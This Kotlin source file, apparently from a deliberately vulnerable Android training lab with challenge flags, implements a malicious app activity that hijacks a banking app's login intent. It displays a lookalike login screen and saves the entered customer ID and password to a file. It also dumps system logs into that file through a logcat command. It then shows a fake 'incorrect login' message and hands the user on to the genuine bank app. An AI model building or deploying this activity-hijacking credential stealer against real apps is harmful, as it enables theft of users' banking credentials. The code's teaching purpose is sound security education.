package uk.ac.swansea.dascalu.dvmicc.money_manager

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.EditText
import androidx.appcompat.app.AppCompatActivity

import com.google.android.material.appbar.MaterialToolbar
import com.google.android.material.snackbar.Snackbar
import java.io.OutputStreamWriter

class LogInActivity : AppCompatActivity() {
    private var paymentURI : Uri? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val securitySettings = loadSecuritySettingsFromFile(this)

        /*Check if the security settings allow the malware to perform its activities.*/
        if (securitySettings.currentChallengeIndex == ACTIVITY_INTENT_HIJACK &&
                securitySettings.malwareOvercome) {
            setContentView(R.layout.activity_log_in)

            val toolbar = findViewById<MaterialToolbar>(R.id.loginActivityToolbar)
            setSupportActionBar(toolbar)

            paymentURI = intent.data

            val customerIDEditText = findViewById<EditText>(R.id.customerIDInput)
            customerIDEditText.setOnEditorActionListener { view , actionId, _ ->
                return@setOnEditorActionListener checkLogin(view, actionId)
            }

            findViewById<EditText>(R.id.passwordInput).setOnEditorActionListener { view, actionId, _ ->
                return@setOnEditorActionListener checkLogin(view, actionId)
            }
        //If this malware should not do anything, terminate this activity and launch the genuine one
        } else {
            sendIntent()
        }
    }

    private fun checkLogin(view: View, actionID: Int) : Boolean {
        if (actionID == EditorInfo.IME_ACTION_DONE) {
            val customerID = findViewById<EditText>(R.id.customerIDInput).text.toString()
            val password = findViewById<EditText>(R.id.passwordInput).text.toString()

            if (customerID != "" && password != "") {
                writeDataToFile(this, resources.getStringArray(R.array.activityHijackflags)[0],
                        customerID, password)

                val snackbar = Snackbar.make(view, view.context.resources.getString(
                        R.string.incorrectLogin), Snackbar.LENGTH_LONG)
                snackbar.addCallback(object : Snackbar.Callback() {
                    override fun onDismissed(transientBottomBar: Snackbar?, event: Int) {
                        sendIntent()
                    }
                })

                snackbar.show()
            } else {
                Snackbar.make(view, "Log In details are incorrect!", Snackbar.LENGTH_LONG).show()
                return false
            }
        }

        return false
    }

    private fun sendIntent() {
        val intent = Intent()
        intent.component = ComponentName("uk.ac.swansea.dascalu.dvmicc.swan_bank",
                "uk.ac.swansea.dascalu.dvmicc.swan_bank.LogInActivity")
        intent.setDataAndType(paymentURI, "text/plain")
        startActivity(intent)

        finish()
    }

    private fun writeDataToFile(context: Context, flag: String?, customerID: String, securityNum: String) {
        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
        val writer = OutputStreamWriter(fileOut)

        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
        Thread.sleep(500)

        if(flag != null) {
            writer.write("\nFlag: $flag\n")
        }

        writer.write("\nCustomer ID: $customerID\nSecurity Number: $securityNum\n")
        writer.close()
    }
}